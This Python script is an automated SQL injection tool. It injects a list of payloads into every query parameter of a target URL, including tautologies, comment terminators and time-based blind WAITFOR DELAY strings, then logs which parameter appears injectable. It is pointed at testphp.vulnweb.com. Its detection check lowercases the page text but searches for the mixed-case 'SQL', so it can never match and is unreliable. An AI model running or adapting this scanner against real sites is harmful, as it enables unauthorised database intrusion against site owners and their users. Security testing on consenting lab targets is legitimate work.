import requests
from bs4 import BeautifulSoup
import logging
from urllib.parse import urlparse, parse_qs

logging.basicConfig(level=logging.INFO)


class SQLInjectionAttack:
    def __init__(self, url):
        self.url = url
        self.params = self.get_params(url)
        self.payloads = [
            "' OR '1'='1",
            " OR 1=1; --",
            '" OR 1=1; --',
            "' OR 'a'='a",
            '" OR "a"="a',
            "' OR 1=1--",
            '" OR 1=1--',
            "` OR 1=1--",
            "' OR 1=1/*",
            "' OR 1=1#",
            "' OR 1=1;%00",
            "' OR 1=1; --",
            "1' WAITFOR DELAY '0:0:10' --",  # blind SQL Injection
            "1\" WAITFOR DELAY '0:0:10' --",  # blind SQL Injection
        ]

    @staticmethod
    def get_params(url):
        return parse_qs(urlparse(url).query)

    def inject_payload(self, payload):
        for key in self.params.keys():
            injected_param_dict = self.params.copy()
            injected_param_dict[key] = payload

            response = requests.get(self.url, params=injected_param_dict)
            if self.is_vulnerable(response.text):
                logging.info(
                    f"Parameter '{key}' is susceptible to SQL Injection. "
                    f"Payload: '{payload}'"
                )
                return True

        return False

    def is_vulnerable(self, response_text):
        bs = BeautifulSoup(response_text, "html.parser")
        if bs.body and "error in your SQL syntax" in bs.body.text.lower():
            return True
        return False

    def attack(self):
        for payload in self.payloads:
            if self.inject_payload(payload):
                logging.info(f"SQL Injection was successful with payload '{payload}'")
                return True

        logging.info("Site seems to be SQL Injection proof.")
        return False


if __name__ == "__main__":
    url = "http://testphp.vulnweb.com/?id=1"
    sql_injection_attack = SQLInjectionAttack(url)
    sql_injection_attack.attack()
